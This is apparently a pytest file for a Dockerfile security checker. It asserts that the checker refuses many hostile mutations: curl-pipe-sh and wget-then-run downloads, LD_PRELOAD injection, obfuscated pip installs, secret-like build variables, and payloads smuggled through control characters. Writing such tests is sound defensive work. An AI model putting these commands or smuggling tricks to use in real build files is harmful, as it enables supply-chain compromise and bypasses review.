FINAL_CMD = f"CMD {json.dumps(['python', '-c', CMD_PROGRAM])}\n"
COMPAT_TAIL = " && test ! -e /usr/local/cuda/compat\n"
COMPAT_PAYLOAD = "# && /opt/python/bin/pip3 install requests"
FINAL_ENV_TAIL = "    OPENTOUR_GPU_LOCK=training/gpu/uv.lock OPENTOUR_GPU_QUALIFICATION=NOT_RUN\n"
FINAL_ENV_PAYLOAD = "#X=1 LD_LIBRARY_PATH=/usr/local/cuda/lib64"
BUILD_ENV_TAIL = f"    UV_PYTHON={PINNED_PYTHON}\n"
BUILD_ENV_PAYLOAD = "#X=1 UV_INDEX_URL=https://x.invalid/simple"
# Every character Python's splitlines() or str.split() treats as a break and BuildKit does not.
SEPARATORS = {
    "cr": "\r",
    "vt": "\v",
    "ff": "\f",
    "fs": "\x1c",
    "gs": "\x1d",
    "rs": "\x1e",
    "nel": "\x85",
    "line_separator": "\u2028",
    "paragraph_separator": "\u2029",
    "nbsp": "\xa0",
}
# (line to extend, smuggled text, the guard that must see the smuggled text as content)
SMUGGLED = {
    "run_compat": (COMPAT_TAIL, COMPAT_PAYLOAD, "run_not_allowlisted"),
    "final_env": (FINAL_ENV_TAIL, FINAL_ENV_PAYLOAD, "env_not_allowlisted"),
    "build_env": (BUILD_ENV_TAIL, BUILD_ENV_PAYLOAD, "env_not_allowlisted"),
}
# X1: a blank line after a trailing `\` is skipped by BuildKit, which then joins the next
# instruction. (line that gains the `\`, what BuildKit's join breaks)
CONTINUED = {
    "workdir": (WORKDIR, ("workdir_not_allowlisted", "not_final_non_root_user")),
    "run": (COMPAT_TAIL, ("run_not_allowlisted",)),
    "env": (FINAL_ENV_TAIL, ("env_not_allowlisted",)),
    "copy": ("COPY --from=build /opt/venv /opt/venv\n", ("copy_from_not_allowed",)),
}
BLANK_LINES = {"empty": "", "spaces": "   ", "tab": "\t"}
_PYTHON_ARTIFACT = json.loads((ROOT / "tools/toolchain.json").read_text())["tools"]["python"]
_PYTHON_ARTIFACT = _PYTHON_ARTIFACT["artifacts"]["Linux-x86_64"]
ADD_BLOCK = (
    f"ADD --checksum=sha256:{_PYTHON_ARTIFACT['sha256']} \\\n"
    f"    {_PYTHON_ARTIFACT['url']} \\\n"
    "    /tmp/cpython.tar.gz\n"
)


def after_final_copies(line: str) -> tuple[tuple[str, str], ...]:
    return ((FINAL_COPIES, FINAL_COPIES + line + "\n"),)


def after_compat_removal(line: str) -> tuple[tuple[str, str], ...]:
    return ((COMPAT_RUN, COMPAT_RUN + line + "\n"),)


def final_run(line: str) -> tuple[tuple[str, str], ...]:
    return before_workdir(f"RUN {line}")


MUTATIONS = {
    # F1: final-stage library path and loader injection
    "env_moved_to_build_stage": (
        (
            (LD, ""),
            ("ENV UV_NO_CACHE=1", "ENV LD_LIBRARY_PATH=/usr/local/nvidia/lib\nENV UV_NO_CACHE=1"),
        ),
        "library_path_inherited",
    ),
    "library_path_missing": (((LD, ""),), "library_path_inherited"),
    "library_path_dollar": (
        ld("/usr/local/nvidia/lib:${LD_LIBRARY_PATH}"),
        "library_path_inherited",
    ),
    "library_path_quoted_cuda": (ld('"/usr/local/cuda/lib64"'), "system_cuda_on_library_path"),
    "library_path_versioned_cuda": (
        ld("/usr/local/nvidia/lib:/usr/local/cuda-13.0/lib64"),
        "system_cuda_on_library_path",
    ),
    "library_path_semicolon": (
        ld("/usr/local/nvidia/lib;/usr/local/cuda/lib64"),
        "system_cuda_on_library_path",
    ),
    "library_path_double_slash": (
        ld("/usr/local/nvidia/lib://usr/local/cuda/lib64"),
        "system_cuda_on_library_path",
    ),
    "library_path_dot_dot": (ld("/usr/local/nvidia/../cuda/lib64"), "system_cuda_on_library_path"),
    "library_path_quoted_space": (
        ld('"/opt/x y:/usr/local/cuda/lib64"'),
        "system_cuda_on_library_path",
    ),
    "library_path_system_lib": (
        ld("/usr/local/nvidia/lib:/usr/lib/x86_64-linux-gnu"),
        "system_cuda_on_library_path",
    ),
    "library_path_empty_entry": (
        ld("/usr/local/nvidia/lib::/usr/local/nvidia/lib64"),
        "library_path_relative",
    ),
    "library_path_legacy_env": (
        before_workdir("ENV LD_LIBRARY_PATH /usr/local/cuda/lib64"),
        "system_cuda_on_library_path",
    ),
    "ld_preload": (((LD, LD + "    LD_PRELOAD=/opt/x/libx.so \\\n"),), "loader_injection"),
    "ld_audit": (((LD, LD + "    LD_AUDIT=/opt/x/libx.so \\\n"),), "loader_injection"),
    # F2: every install must be the hashed lock install
    "extra_uv_pip_install": (
        chain("uv pip install --python /opt/venv/bin/python requests"),
        "package_command_not_allowed",
    ),
    "venv_pip3_install": (
        chain("/opt/venv/bin/pip3 install requests"),
        "package_command_not_allowed",
    ),
    "python_m_pip": (
        chain("/opt/venv/bin/python -m pip install requests"),
        "package_command_not_allowed",
    ),
    "or_uv_pip_install": (chain("true || uv pip install requests"), "package_command_not_allowed"),
    "semicolon_pip_install": (chain("true; pip install requests"), "package_command_not_allowed"),
    "uv_tool_install": (chain("uv tool install requests"), "package_command_not_allowed"),
    "sh_c_pip_install": (chain('sh -c "pip install requests"'), "package_command_not_allowed"),
    "env_wrapped_uv": (
        chain("env uv pip install --python /opt/venv/bin/python requests"),
        "package_command_not_allowed",
    ),
    "hashes_dropped": (
        (("--require-hashes --no-deps --no-build", "--no-deps --no-build"),),
        "package_command_not_allowed",
    ),
    "export_unpinned_python": (
        ((f"--python {PINNED_PYTHON} -o", "-o"),),
        "package_command_not_allowed",
    ),
    # F3: keywords are case-insensitive
    "lowercase_user_root": (
        (("USER 10001:10001\n", "USER 10001:10001\nuser root\n"),),
        "not_final_non_root_user",
    ),
    "lowercase_add": (before_workdir("add https://x.invalid/f /tmp/f"), "add_not_pinned"),
    "tag_only_from": (
        ((f"FROM {BASE_IMAGE}\n", "from docker.io/nvidia/cuda:13.0.3-base-ubuntu24.04\n"),),
        "from_not_digest_pinned",
    ),
    "arg_selected_base": (
        (
            (f"FROM {UV_IMAGE} AS uv", f"ARG CUDA_BASE_IMAGE={BASE_IMAGE}\nFROM {UV_IMAGE} AS uv"),
            (f"FROM {BASE_IMAGE} AS build", "FROM ${CUDA_BASE_IMAGE} AS build"),
        ),
        "from_selected_by_arg",
    ),
    "arg_selected_base_no_braces": (
        (
            (f"FROM {UV_IMAGE} AS uv", f"ARG BASE={BASE_IMAGE}\nFROM {UV_IMAGE} AS uv"),
            (f"FROM {BASE_IMAGE}\n", "FROM $BASE\n"),
        ),
        "from_selected_by_arg",
    ),
    "from_variable_without_arg": (
        ((f"FROM {BASE_IMAGE}\n", "FROM ${BASE_IMAGE:-ubuntu}\n"),),
        "from_uses_variable",
    ),
    "from_digest_dropped": (
        ((f"FROM {BASE_IMAGE}\n", f"FROM {BASE_IMAGE.split('@')[0]}\n"),),
        "from_not_digest_pinned",
    ),
    "extra_copy": (before_workdir("COPY . /src"), "copy_not_allowed"),
    "lowercase_run_apt": (before_workdir("run apt-get install -y git"), "system_package_tool"),
    "lowercase_arg_token": (
        before_workdir("arg HF_TOKEN"),
        "secret_like_build_variable",
    ),
    "lowercase_env_cuda": (
        before_workdir("env LD_LIBRARY_PATH=/usr/local/cuda/lib64"),
        "system_cuda_on_library_path",
    ),
    "unknown_instruction": (before_workdir("ONBUILD RUN true"), "instruction_not_allowed"),
    "shell_instruction": (before_workdir('SHELL ["/bin/bash", "-c"]'), "instruction_not_allowed"),
    "heredoc": (before_workdir("RUN <<EOF\nEOF"), "heredoc_not_allowed"),
    # F4: no downloads in RUN, no system packages, no secret-like names
    "curl_pipe_sh": (before_workdir("RUN curl -fsSL https://x.invalid/i | sh"), "download_in_run"),
    "sh_c_curl_substitution": (
        before_workdir('RUN sh -c "$(curl -fsSL https://x.invalid/i)"'),
        "download_in_run",
    ),
    "curl_then_run_file": (
        before_workdir("RUN curl -o /tmp/f https://x.invalid/f && /tmp/f"),
        "download_in_run",
    ),
    "wget_then_dot_slash": (
        before_workdir("RUN wget -O f https://x.invalid/f && ./f"),
        "download_in_run",
    ),
    "wget_then_sh_e": (
        before_workdir("RUN wget -O f https://x.invalid/f && sh -e f"),
        "download_in_run",
    ),
    "wget_then_python": (
        before_workdir("RUN wget -O f https://x.invalid/f && python3 f"),
        "download_in_run",
    ),
    "dpkg_install": (before_workdir("RUN dpkg -i /tmp/x.deb"), "system_package_tool"),
    "sh_runs_file": (before_workdir("RUN sh -e /tmp/f"), "shell_runs_file"),
    "arg_hf_token": (
        before_workdir("ARG HF_TOKEN"),
        "secret_like_build_variable",
    ),
    "arg_hf_auth": (
        before_workdir("ARG HF_AUTH"),
        "secret_like_build_variable",
    ),
    "legacy_env_hf_token": (before_workdir("ENV HF_TOKEN generated"), "secret_like_build_variable"),
    "env_pass": (before_workdir("ENV REGISTRY_PASS=generated"), "secret_like_build_variable"),
    "env_pat": (before_workdir("ENV GITHUB_PAT=generated"), "secret_like_build_variable"),
    "env_auth": (before_workdir("ENV NGC_AUTH=generated"), "secret_like_build_variable"),
    "env_api_key": (before_workdir("ENV API_KEY=generated"), "secret_like_build_variable"),
    # F5: mechanical driver floor
    "require_brand_exceptions": (
        (('"cuda>=13.0"', '"cuda>=13.0 brand=tesla,driver>=535,driver<536"'),),
        "driver_floor_not_enforced",
    ),
    "require_dropped": (
        (('    NVIDIA_REQUIRE_CUDA="cuda>=13.0" \\\n', ""),),
        "driver_floor_not_enforced",
    ),
    "disable_require": (
        before_workdir("ENV NVIDIA_DISABLE_REQUIRE=1"),
        "driver_floor_not_enforced",
    ),
    "compat_kept": (
        (("RUN rm -rf /usr/local/cuda/compat /usr/local/cuda-13.0/compat", "RUN true"),),
        "compat_libcuda_present",
    ),
    # N7: COPY --from must name only the allowlisted stage sources (keyword case-insensitive).
    "n7_copy_from_unpinned_image": (
        after_final_copies(
            "COPY --from=docker.io/library/ubuntu:latest"
            " /usr/lib/x86_64-linux-gnu/libz.so.1 /opt/venv/lib/"
        ),
        "copy_from_not_allowed",
    ),
    "n7_lowercase_copy_from": (
        after_final_copies("copy --from=ubuntu /usr/lib/x86_64-linux-gnu/libz.so.1 /opt/venv/lib/"),
        "copy_from_not_allowed",
    ),
    "n7_uppercase_from_flag": (
        after_final_copies("COPY --FROM=ubuntu /usr/lib/x86_64-linux-gnu/libz.so.1 /opt/venv/lib/"),
        "copy_from_not_allowed",
    ),
    # N8: compat removal must be the final state of the final stage.
    "n8_copy_compat_back_after_removal": (
        after_compat_removal(
            "COPY --from=build /usr/local/cuda-13.0/compat /usr/local/cuda-13.0/compat"
        ),
        ("compat_restored_after_removal", "copy_from_not_allowed"),
    ),
    "n8_removal_moved_before_copies": (
        ((COMPAT_RUN, ""), (FINAL_COPIES, COMPAT_RUN + FINAL_COPIES)),
        "compat_restored_after_removal",
    ),
    # N9: no RUN flags (bind mounts of other images, secrets, host network).
    "n9_run_mount_unpinned_image": (
        final_run(
            "--mount=type=bind,from=docker.io/library/python:3.12,target=/m"
            " cp -a /m/... /opt/venv/..."
        ),
        ("run_flags_not_allowed", "run_not_allowlisted"),
    ),
    "n9_run_mount_secret": (
        (("RUN groupadd", "RUN --mount=type=secret,id=hf groupadd"),),
        ("run_flags_not_allowed", "run_not_allowlisted"),
    ),
    "n9_run_network_host": (
        (("RUN uv export", "RUN --network=host uv export"),),
        ("run_flags_not_allowed", "run_not_allowlisted"),
    ),
    # N1-N6, N24: obfuscated installs, downloads and loader edits; RUN text is allowlisted.
    "obf_variable_pip": (chain("P=/opt/python/bin/pip3 && $P install"), OBFUSCATED),
    "obf_substitution_pip": (chain("$(echo pip3) install"), OBFUSCATED),
    "obf_backtick_pip": (chain("`echo pip3` install"), OBFUSCATED),
    "obf_copied_uv": (chain('cp uv u && u pip "install"'), OBFUSCATED),
    "obf_find_exec": (chain('find -exec {} pip "install"'), OBFUSCATED),
    "obf_env_split_string": (chain('env -S "uv pip ins""tall"'), OBFUSCATED),
    "obf_eval": (chain('eval "pip3 ins""tall"'), OBFUSCATED),
    "obf_eval_unquoted": (chain("eval pip3 install"), "run_not_allowlisted"),
    "obf_python_pip_main": (
        chain("python3.12 -c \"import pip._internal.cli.main as p; p.main(['ins'+'tall'])\""),
        OBFUSCATED,
    ),
    "obf_python_urllib": (
        chain(
            'python3.12 -c "import urllib.request as u;'
            " u.urlretrieve('https://x.invalid/f', '/tmp/f')\""
        ),
        OBFUSCATED,
    ),
    "obf_split_curl": (chain("cur''l -o /tmp/f https://x.invalid/f"), OBFUSCATED),
    "obf_ld_so_conf": (
        final_run("echo /usr/local/cuda/lib64 > /etc/ld.so.conf.d/zz.conf && ldconfig"),
        OBFUSCATED,
    ),
    # Earlier review controls that must stay caught.
    "ctl_usr_bin_env_uv": (
        chain("/usr/bin/env uv pip install --python /opt/venv/bin/python requests"),
        ("package_command_not_allowed", "run_not_allowlisted"),
    ),
    "ctl_xargs_uv": (
        chain("xargs uv pip install --python /opt/venv/bin/python"),
        ("package_command_not_allowed", "run_not_allowlisted"),
    ),
    "ctl_exec_pip3": (
        chain("exec pip3 install requests"),
        ("package_command_not_allowed", "run_not_allowlisted"),
    ),
    "ctl_json_odd_spacing": (
        before_workdir('RUN [ "pip3" ,"install",  "requests" ]'),
        "run_not_allowlisted",
    ),
    "ctl_unicode_lookalike_keyword": (
        before_workdir("\u0420UN pip3 install requests"),
        "instruction_not_allowed",
    ),
    "ctl_non_ascii_folding_keyword": (before_workdir("u\u017fer root"), "instruction_not_allowed"),
    "ctl_tab_after_run": (
        before_workdir("RUN\tpip3 install requests"),
        ("package_command_not_allowed", "run_not_allowlisted"),
    ),
    "ctl_second_add_checksum": (
        before_workdir(f"ADD --checksum=sha256:{'0' * 64} https://x.invalid/f /tmp/f"),
        "add_not_pinned",
    ),
    "ctl_user_root_before_non_root": (
        (("USER 10001:10001\n", "USER root\nUSER 10001:10001\n"),),
        "not_final_non_root_user",
    ),
    "ctl_healthcheck": (
        before_workdir("HEALTHCHECK CMD python -c 'print(1)'"),
        "instruction_not_allowed",
    ),
    # ENV is allowlisted per stage: uv reads UV_NO_VERIFY_HASHES and similar from the env.
    "env_no_verify_hashes": (
        (("RUN uv export", "ENV UV_NO_VERIFY_HASHES=1\nRUN uv export"),),
        "env_not_allowlisted",
    ),
    "env_final_extra_variable": (
        before_workdir("ENV PYTHONPATH=/tmp"),
        "env_not_allowlisted",
    ),
    "env_safepath_dropped": (
        ((" PYTHONSAFEPATH=1 \\\n", " \\\n"),),
        "env_not_allowlisted",
    ),
    # M1: start-time commands. C1 installs from CMD; C2 and C4 wrap the command in ENTRYPOINT.
    "c1_cmd_installs_at_start": (
        (
            (
                FINAL_CMD,
                'CMD ["/bin/sh", "-c", "/opt/python/bin/pip3 install requests && exec python"]\n',
            ),
        ),
        "cmd_not_allowlisted",
    ),
    "c2_entrypoint_env_library_path": (
        (
            (
                "ENTRYPOINT []\n",
                'ENTRYPOINT ["/usr/bin/env","LD_LIBRARY_PATH=/usr/local/cuda/lib64"]\n',
            ),
        ),
        "entrypoint_not_allowlisted",
    ),
    "c4_entrypoint_shell_install": (
        (
            (
                "ENTRYPOINT []\n",
                'ENTRYPOINT ["/bin/sh","-c","/opt/python/bin/pip3 install requests;'
                ' exec \\"$@\\"","--"]\n',
            ),
        ),
        "entrypoint_not_allowlisted",
    ),
    "cmd_json_respaced": (
        ((FINAL_CMD, FINAL_CMD.replace('", "-c"', '","-c"')),),
        "cmd_not_allowlisted",
    ),
    # CMD is compared verbatim, so whitespace inside the JSON is not collapsed away.
    # J1: BuildKit joins continued lines verbatim; `\` glued to text plus an unindented next
    # line fuses two ENV pairs into one word, leaving the second variable unset.
    "j1_f1_path_absorbs_library_path": (
        (
            (
                'ENV PATH="/opt/venv/bin:${PATH}" \\\n    LD_LIBRARY_PATH=',
                'ENV PATH="/opt/venv/bin:${PATH}"\\\nLD_LIBRARY_PATH=',
            ),
        ),
        ("dockerfile_continuation_without_separator", "env_not_allowlisted"),
    ),
    "j1_f2_library_path_absorbs_driver_floor": (
        (
            (
                "/usr/local/nvidia/lib64 \\\n    NVIDIA_REQUIRE_CUDA=",
                "/usr/local/nvidia/lib64\\\nNVIDIA_REQUIRE_CUDA=",
            ),
        ),
        ("dockerfile_continuation_without_separator", "env_not_allowlisted"),
    ),
    "j1_f3_hf_home_absorbs_offline": (
        (
            (
                "    HF_HOME=/home/trainer/.cache/huggingface \\\n    HF_HUB_OFFLINE=1",
                "    HF_HOME=/home/trainer/.cache/huggingface\\\nHF_HUB_OFFLINE=1",
            ),
        ),
        ("dockerfile_continuation_without_separator", "env_not_allowlisted"),
    ),
    "j1_run_fused": (
        ((" && ldconfig \\\n && test", " && ldconfig\\\n&& test"),),
        ("dockerfile_continuation_without_separator", "run_not_allowlisted"),
    ),
    "comment_inside_continuation": (
        ((INSTALL, INSTALL + "# kept out of the RUN by BuildKit\n"),),
        "dockerfile_comment_in_continuation",
    ),
    "cmd_double_space": (
        ((FINAL_CMD, FINAL_CMD.replace('", "-c"', '",  "-c"')),),
        "cmd_not_allowlisted",
    ),
    "cmd_second_instruction": (
        ((FINAL_CMD, FINAL_CMD + 'CMD ["python"]\n'),),
        "cmd_not_allowlisted",
    ),
    "entrypoint_in_build_stage": (
        (("WORKDIR /src\n", "WORKDIR /src\nENTRYPOINT []\n"),),
        "entrypoint_not_allowlisted",
    ),
    # L1 (W1): the working directory must not be the writable operator mount.
    "w1_workdir_operator_mount": (
        ((WORKDIR, "WORKDIR /run/opentour\n"),),
        "workdir_not_allowlisted",
    ),
    "workdir_build_stage_changed": (
        (("WORKDIR /src\n", "WORKDIR /tmp\n"),),
        "workdir_not_allowlisted",
    ),
    # Inventories are per stage: the same instruction in another stage is refused.
    "add_moved_to_final_stage": (
        ((ADD_BLOCK, ""), (WORKDIR, ADD_BLOCK + WORKDIR)),
        "add_not_pinned",
    ),
    "copy_lock_moved_to_final_stage": (
        ((LOCK_COPY, ""), (WORKDIR, LOCK_COPY + WORKDIR)),
        "copy_not_allowed",
    ),
    "copy_uv_into_final_stage": (
        after_final_copies("COPY --from=uv /uv /usr/local/bin/uv"),
        "copy_from_not_allowed",
    ),
}


@pytest.mark.parametrize("separator", sorted(SEPARATORS))
@pytest.mark.parametrize("variant", sorted(SMUGGLED))
def test_line_separators_cannot_smuggle_content(variant: str, separator: str) -> None:
    """H1 (E1-E3): text after a separator BuildKit keeps in the line is content, not a comment."""
    line, payload, guard = SMUGGLED[variant]
    text = read_dockerfile()
    assert text.count(line) == 1, line
    text = text.replace(line, line.removesuffix("\n") + SEPARATORS[separator] + payload + "\n")
    found = image_hazards(text)
    assert "dockerfile_non_ascii_or_control" in found, found
    # Independent of the character rule: the parser itself must see the payload.
    assert guard in found, found


@pytest.mark.parametrize("blank", sorted(BLANK_LINES))
@pytest.mark.parametrize("position", sorted(CONTINUED))
def test_blank_line_inside_a_continuation_is_refused(position: str, blank: str) -> None:
    """X1: `INSTRUCTION ... \\` then a blank line. BuildKit joins the next instruction."""
    line, joined_hazards = CONTINUED[position]
    text = read_dockerfile()
    assert text.count(line) == 1, line
    text = text.replace(line, line.removesuffix("\n") + " \\\n" + BLANK_LINES[blank] + "\n")
    found = image_hazards(text)
    assert "dockerfile_empty_continuation_line" in found, found
    # The parse follows BuildKit's join, so the swallowed instruction is visible too.
    for hazard in joined_hazards:
        assert hazard in found, found


def test_env_bare_word_is_kept_as_unparseable() -> None:
    # What an ENV swallowing `WORKDIR /home/trainer` through a continuation looks like.
    assert env_assignments("A=1 WORKDIR /x") == [
        ("A", "1"),
        ("__UNPARSEABLE__", "WORKDIR"),
        ("__UNPARSEABLE__", "/x"),
    ]


def test_glued_backslash_before_an_indented_line_is_equivalent() -> None:
    """Positive control for J1: in BuildKit's verbatim join a blank on either side of `\\`
    separates the words, so dropping only one of the two blanks changes nothing."""
    text = read_dockerfile()
    for old, new in (
        ('ENV PATH="/opt/venv/bin:${PATH}" \\\n', 'ENV PATH="/opt/venv/bin:${PATH}"\\\n'),
        (" && ldconfig \\\n", " && ldconfig\\\n"),
        # A blank before `\` is the separator when the next line is not indented.
        ("huggingface \\\n    HF_HUB_OFFLINE=1", "huggingface \\\nHF_HUB_OFFLINE=1"),
    ):
        assert text.count(old) == 1, old
        text = text.replace(old, new)
    assert image_hazards(text) == []


def test_x1_reviewer_payload_is_refused() -> None:
    text = read_dockerfile().replace("WORKDIR /home/trainer\n", "WORKDIR /home/trainer \\\n\n")
    found = image_hazards(text)
    assert "dockerfile_empty_continuation_line" in found, found
    assert "not_final_non_root_user" in found, found


# Full parity with BuildKit's line rules, checked against BuildKit's own parser rather than a
# description of it: each value is what github.com/moby/buildkit v0.24.0
# frontend/dockerfile/parser.Parse makes of the text (Node.Original after strings.TrimSpace).
# Its continuation regex, trimNewline and scanLines are the same in v0.11.6, v0.12.5, v0.15.2,
# v0.18.2, v0.21.1 and master. Rerun that parser for any new case.
BUILDKIT_PARSES: dict[str, tuple[str, list[str]]] = {
    "blank_line_inside_continuation": ("RUN a \\\n\n b\n", ["RUN a  b"]),
    "bom_first_line": ("\ufeffRUN a\n", ["RUN a"]),
    "bom_then_syntax_directive": ("\ufeff# syntax=docker.io/x/y\nRUN a\n", ["RUN a"]),
    "c_style_syntax_directive": (
        "//syntax=docker.io/x/y\nRUN a\n",
        ["//syntax=docker.io/x/y", "RUN a"],
    ),
    "comment_inside_continuation": ("RUN a \\\n# c\n b\n", ["RUN a  b"]),
    "comment_with_backslash_does_not_continue": ("# c \\\nRUN a\n", ["RUN a"]),
    "continuation_keeps_leading_blanks": ("RUN a \\\n    b \\\n\tc\n", ["RUN a     b \tc"]),
    "cr_before_backslash_is_content": ("RUN a\r\\\n b\n", ["RUN a\r b"]),
    "crcr_line_end_continues": ("RUN a \\\r\r\n b\n", ["RUN a  b"]),
    "crcr_plain_line_end": ("RUN a\r\r\nUSER root\n", ["RUN a", "USER root"]),
    "crlf_file": ("RUN a \\\r\n b\r\nUSER root\r\n", ["RUN a  b", "USER root"]),
    "dangling_continuation_at_eof": ("RUN a \\", ["RUN a"]),
    "dangling_continuation_with_newline": ("RUN a \\\n", ["RUN a"]),
    "escaped_backslash_ends_instruction": ("RUN a \\\\\nUSER root\n", ["RUN a \\\\", "USER root"]),
    "escaped_backslash_then_blanks": ("RUN a \\\\ \t\nUSER root\n", ["RUN a \\\\", "USER root"]),
    "file_separator_before_hash_is_not_a_comment": ("\x1c# c\nRUN a\n", ["\x1c# c", "RUN a"]),
    "file_separator_line_is_content": ("RUN a \\\n\x1c\n b\n", ["RUN a \x1c", "b"]),
    "file_separator_trailing_is_kept": ("RUN a\x1c\n", ["RUN a\x1c"]),
    "first_line_leading_blanks_trimmed": ("   RUN a\n\t USER root\n", ["RUN a", "USER root"]),
    "glued_join": ("ENV A=1\\\nB=2\n", ["ENV A=1B=2"]),
    "ideographic_space_blank_line_in_continuation": ("RUN a \\\n\u3000\n b\n", ["RUN a  b"]),
    "indented_comment_inside_continuation": ("RUN a \\\n  # c\n b\n", ["RUN a  b"]),
    "indented_lone_backslash": ("RUN a \\\n   \\\n b\n", ["RUN a     b"]),
    "json_syntax_directive": ('{"syntax": "docker.io/x/y"}', ['{"syntax": "docker.io/x/y"}']),
    "line_separator_blank_line_in_continuation": ("RUN a \\\n\u2028\n b\n", ["RUN a  b"]),
    "lone_backslash_first_line": ("\\\nRUN a\n", ["RUN a"]),
    "lone_backslash_inside_continuation": ("RUN a \\\n\\\n b\n", ["RUN a  b"]),
    "lone_backslash_with_blanks_inside": ("RUN a \\\n\\ \t\n b\n", ["RUN a  b"]),
    "nbsp_indented_comment": ("\xa0# c\nRUN a\n", ["RUN a"]),
    "nel_indented_comment": ("\x85# c\nRUN a\n", ["RUN a"]),
    "shebang_then_syntax_directive": ("#!/bin/sh\n# syntax=docker.io/x/y\nRUN a\n", ["RUN a"]),
    "syntax_directive": ("# syntax=docker.io/x/y\nRUN a\n", ["RUN a"]),
    "tab_after_keyword": ("RUN\ta\n", ["RUN\ta"]),
    "three_backslashes_end_instruction": (
        "RUN a \\\\\\\nUSER root\n",
        ["RUN a \\\\\\", "USER root"],
    ),
    "unit_separator_line_is_content": ("RUN a \\\n\x1f\n b\n", ["RUN a \x1f", "b"]),
    "vertical_tab_after_backslash_does_not_continue": ("RUN a \\\x0b\n b\n", ["RUN a \\", "b"]),
}


@pytest.mark.parametrize("name", sorted(BUILDKIT_PARSES))
def test_the_line_join_matches_buildkit(name: str) -> None:
    text, expected = BUILDKIT_PARSES[name]
    assert dockerfile_instructions(text)[1] == expected


def test_an_escaped_backslash_ends_the_instruction_as_in_buildkit() -> None:
    # `\\` at the end of a line is an escaped backslash, not a continuation, so USER stays its
    # own instruction. A join that treated it as a continuation would swallow USER instead.
    text = read_dockerfile().replace(WORKDIR, "WORKDIR /home/trainer\\\\\n")
    assert image_hazards(text) == ["workdir_not_allowlisted"]


def test_a_lone_backslash_line_is_dropped_by_the_join_and_refused() -> None:
    # BuildKit's trim removes a `\\` that stands alone, so the ENV it builds is unchanged; the
    # line is still refused, like a blank or comment line inside a continuation.
    for lone in ("\\", "  \\", "\\ \t"):
        text = read_dockerfile().replace(LD, LD + lone + "\n")
        assert image_hazards(text) == ["dockerfile_lone_continuation_line"], lone
        # Alone before an instruction it continues into that instruction, changing nothing.
        text = read_dockerfile().replace(WORKDIR, lone + "\n" + WORKDIR)
        assert image_hazards(text) == ["dockerfile_lone_continuation_line"], lone


def test_extra_carriage_returns_are_trimmed_by_the_join_and_refused() -> None:
    # BuildKit drops every trailing \r (trimNewline), so the parse is the real file's; only the
    # character rule, which allows one \r per line, refuses it.
    text = read_dockerfile().replace("\n", "\r\r\n")
    assert image_hazards(text) == ["dockerfile_non_ascii_or_control"]


def test_a_byte_order_mark_is_discarded_by_the_join_and_refused() -> None:
    assert image_hazards("\ufeff" + read_dockerfile()) == ["dockerfile_non_ascii_or_control"]


@pytest.mark.parametrize("separator", ["\x1c", "\x1d", "\x1e", "\x1f"])
def test_a_separator_only_line_is_content_not_a_blank_line(separator: str) -> None:
    # Python's str.strip() treats \x1c-\x1f as whitespace and Go's unicode.IsSpace does not,
    # so BuildKit ends the ENV at such a line and parses the lines after it as instructions.
    found = image_hazards(read_dockerfile().replace(LD, LD + separator + "\n"))
    assert "dockerfile_non_ascii_or_control" in found, found
    assert {"env_not_allowlisted", "instruction_not_allowed"} <= set(found), found
    assert "dockerfile_empty_continuation_line" not in found, found


@pytest.mark.parametrize("end", ["", "\n"])
def test_a_dangling_final_continuation_keeps_its_instruction(end: str) -> None:
    # BuildKit builds the CMD even when the file ends inside a continuation. It is refused here,
    # but the join keeps the instruction, so nothing else looks missing.
    text = read_dockerfile().replace(FINAL_CMD, FINAL_CMD.removesuffix("\n") + " \\" + end)
    assert image_hazards(text) == ["dangling_continuation"]


@pytest.mark.parametrize(
    "header",
    [
        "# syntax=docker.io/x/y\n",
        "#syntax=docker.io/x/y\n",
        "  # SyNtAx = docker.io/x/y\n",
        "//syntax=docker.io/x/y\n",
        "// syntax=docker.io/x/y\n",
        "\ufeff# syntax=docker.io/x/y\n",
        "#!/bin/sh\n# syntax=docker.io/x/y\n",
        "# escape=`\n",
        "# check=skip=all\n",
    ],
)
def test_every_buildkit_directive_form_is_refused(header: str) -> None:
    # BuildKit hands the whole build to the image a syntax directive names, in each of these
    # forms (parser.DetectSyntax), so an unpinned frontend could build anything from this file.
    assert "parser_directive" in image_hazards(header + read_dockerfile())


@pytest.mark.parametrize("prefix", ["", "#!/bin/sh\n"])
def test_a_json_syntax_document_is_refused(prefix: str) -> None:
    assert "parser_directive" in image_hazards(prefix + '{"syntax": "docker.io/x/y"}')


def test_instruction_arguments_keep_what_go_does_not_trim() -> None:
    # BuildKit's USER here is `10001:10001\x1c`: strings.TrimSpace keeps \x1c, which Python's
    # str.strip() would drop, and the final-user check would then pass.
    text = read_dockerfile().replace("USER 10001:10001\n", "USER 10001:10001\x1c\n")
    assert "not_final_non_root_user" in image_hazards(text)


@pytest.mark.parametrize("name", sorted(MUTATIONS))
def test_image_hazard_checks_reject_each_mutation(name):
    edits, expected = MUTATIONS[name]
    text = read_dockerfile()
    for old, new in edits:
        assert text.count(old) == 1, old
        text = text.replace(old, new)
    found = image_hazards(text)
    for hazard in (expected,) if isinstance(expected, str) else expected:
        assert hazard in found, found


def gpu_references(text: str, allowed: tuple[str, ...] = ()) -> bool:
    for permitted in allowed:
        text = text.replace(permitted, "")
    return GPU_REL in text


# The OSV scan may read the GPU lock as an input; nothing else in the CI runner may name it.
CI_ALLOWED = ('"--lockfile=training/gpu/uv.lock"',)


def test_justfile_and_ci_runner_never_reference_the_gpu_project():
    assert not gpu_references((ROOT / "justfile").read_text())
    assert not gpu_references((ROOT / "tools/ci/run.py").read_text(), CI_ALLOWED)
    # Adverse controls for the checker itself.
    assert gpu_references("sync:\n    uv sync --project training/gpu\n")
    assert gpu_references('"--lockfile=training/gpu/uv.lock", "training/gpu"', CI_ALLOWED)
    assert not gpu_references('        "--lockfile=training/gpu/uv.lock",\n', CI_ALLOWED)


PINNED_UV = "uv 0.13.8"


def pinned_uv() -> str | None:
    for candidate in (os.environ.get("OPENTOUR_UV"), shutil.which("uv")):
        if not candidate:
            continue
        try:
            version = (
                subprocess.run(
                    [candidate, "--version"],
                    capture_output=True,
                    text=True,
                    timeout=20,
                    check=False,
                )
                .stdout.split(" (")[0]
                .strip()
            )
        except OSError:
            continue
        if version == PINNED_UV:
            return candidate
    return None


@pytest.mark.local_integration
def test_gpu_lock_is_current_with_the_pinned_uv_offline():
    """Runs the real `uv lock --check` offline. A skip here is NOT a pass: it means the pinned
    uv or the pinned interpreter was absent and lock currency was not checked."""
    uv = pinned_uv()
    if uv is None:
        pytest.skip(f"{PINNED_UV} not found (OPENTOUR_UV or PATH); lock currency NOT checked")
